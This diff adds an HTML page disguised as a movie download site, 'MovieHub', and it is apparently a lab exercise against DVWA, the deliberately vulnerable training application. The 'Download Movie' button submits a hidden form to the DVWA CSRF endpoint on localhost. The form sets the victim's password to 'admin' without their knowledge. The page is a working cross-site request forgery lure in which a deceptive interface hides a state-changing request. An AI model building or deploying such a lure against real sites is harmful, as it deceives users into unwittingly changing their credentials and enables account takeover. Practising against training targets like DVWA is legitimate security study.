@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MovieHub - Download Your Favorite Movies</title>
+    <style>
+      /* General Styling */
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #121212; /* Dark theme background */
+        color: #ffffff; /* White text */
+        text-align: center;
+        margin: 0;
+        padding: 0;
+      }
+
+      /* Header Styling */
+      h1 {
+        font-size: 2.5em;
+        margin-top: 50px;
+        color: #f4c10f; /* Golden text for movie vibe */
+      }
+
+      p {
+        font-size: 1.2em;
+        margin: 20px auto;
+        max-width: 600px;
+      }
+
+      /* Movie Styling */
+      .movie {
+        margin: 20px auto;
+        padding: 20px;
+        background: #1e1e1e; /* Slightly lighter dark background */
+        border-radius: 10px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        max-width: 500px;
+        text-align: left;
+      }
+
+      .movie img {
+        width: 100%; /* Responsive image */
+        border-radius: 10px;
+        margin-bottom: 15px;
+      }
+
+      button {
+        background-color: #f4c10f; /* Golden button */
+        color: #121212; /* Dark text */
+        border: none;
+        padding: 10px 20px;
+        font-size: 1.2em;
+        font-weight: bold;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      button:hover {
+        background-color: #ffd700; /* Brighter gold on hover */
+        transform: scale(1.05);
+      }
+
+      footer {
+        margin-top: 30px;
+        font-size: 0.9em;
+        color: #888888;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Welcome to MovieHub</h1>
+    <p>Download the latest movies safely and securely!</p>
+
+    <div class="movie">
+      <h2>Movie Title: "The Hacker"</h2>
+      <img
+        src="https://c4.wallpaperflare.com/wallpaper/371/264/21/itzmauuuroo-hackers-anonymous-hd-wallpaper-preview.jpg"
+        alt="The Hacker Movie Poster"
+      />
+      <p>Genre: Thriller | Year: 2024</p>
+      <p>Description: A gripping tale of cyber warfare and its consequences.</p>
+      <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="admin" />
+        <input type="hidden" name="password_conf" value="admin" />
+        <input type="hidden" name="Change" value="Change" />
+        <button type="submit">Download Movie</button>
+      </form>
+    </div>
+
+    <footer>
+      © 2024 MovieHub. All rights reserved. Terms and conditions apply.
+    </footer>
+  </body>
+</html>
